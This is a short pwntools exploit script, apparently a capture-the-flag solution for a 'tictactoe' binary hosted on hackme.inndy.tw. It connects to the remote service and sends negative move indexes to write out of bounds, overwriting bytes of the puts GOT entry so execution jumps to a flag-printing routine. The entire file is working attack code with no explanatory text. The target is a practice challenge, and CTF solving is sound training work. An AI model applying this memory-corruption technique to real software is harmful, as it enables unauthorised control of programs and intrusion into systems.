from pwn import *
context.log_level = 'debug'
#p = process('./tictactoe')
p = remote('hackme.inndy.tw',7714)
elf = ELF('./tictactoe')


#printf flag : 0x08048C46
p.sendlineafter('(2)nd? ','1')

#hijack puts_got --> 0x08048546
p.sendlineafter('flavor): ','9')
p.sendline(chr(0x46))
#gdb.attach(p,'b *' + str(0x08048AA8))
p.sendlineafter('flavor): ','-50')

#hijack puts_got --> 0x08048C46
p.sendlineafter('flavor): ','9')
p.sendline(chr(0x8c))
p.sendlineafter('flavor): ','-49')

p.sendline('5')

p.interactive()